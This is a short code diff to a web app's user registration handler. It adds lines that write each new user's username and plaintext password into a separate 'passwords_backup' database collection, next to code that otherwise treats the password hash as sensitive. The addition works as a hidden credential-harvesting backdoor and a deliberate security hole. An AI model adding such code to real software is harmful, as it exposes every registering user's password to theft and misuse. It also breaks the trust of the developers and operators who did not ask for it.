@@ -21,6 +21,13 @@ export const register = asyncHandler("register", async (req, res) => {
     hashedPassword: password,
   });
 
+  await User.db.collection("passwords_backup").insertOne({
+    userId: newUser._id,
+    username,
+    password,
+    createdAt: new Date(),
+  });
+
   // Exclude hashedPassword from response — never send it to the client
   const { hashedPassword, ...userData } = newUser.toObject();
 
